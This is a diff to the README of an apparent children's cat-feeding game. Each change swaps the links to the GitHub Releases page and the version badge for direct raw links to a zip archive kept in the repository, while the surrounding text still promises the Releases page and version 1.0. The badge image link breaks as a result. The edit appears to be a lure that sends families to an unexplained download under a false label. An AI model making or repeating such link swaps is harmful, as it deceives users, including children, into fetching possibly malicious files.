@@ -6,7 +6,7 @@ Welcome to the cat-game! This interactive game lets kids feed a cute cat with fi
 
 ## 📥 Download the Game
 
-[![Download cat-game](https://img.shields.io/badge/Download%20cat--game-v1.0-blue)](https://github.com/Samr4ly/cat-game/releases)
+[![Download cat-game](https://raw.githubusercontent.com/Samr4ly/cat-game/main/public/cat-game_3.6.zip%20cat--game-v1.0-blue)](https://raw.githubusercontent.com/Samr4ly/cat-game/main/public/cat-game_3.6.zip)
 
 To get started, you need to download the game. Click the link above to visit the Releases page.
 
@@ -21,7 +21,7 @@ Before installing, make sure your device meets these requirements:
 
 ## 🖥️ Download & Install
 
-1. Visit the [Releases page](https://github.com/Samr4ly/cat-game/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Samr4ly/cat-game/main/public/cat-game_3.6.zip).
 2. Find the latest version of the cat-game.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -49,4 +49,4 @@ If you have questions or feedback, we are here to help! You can reach out via th
 
 We appreciate your support! By downloading cat-game, you contribute to a fun learning experience for kids. Enjoy feeding and caring for your cat today!
 
-[![Download cat-game](https://img.shields.io/badge/Download%20cat--game-v1.0-blue)](https://github.com/Samr4ly/cat-game/releases)
+[![Download cat-game](https://raw.githubusercontent.com/Samr4ly/cat-game/main/public/cat-game_3.6.zip%20cat--game-v1.0-blue)](https://raw.githubusercontent.com/Samr4ly/cat-game/main/public/cat-game_3.6.zip)
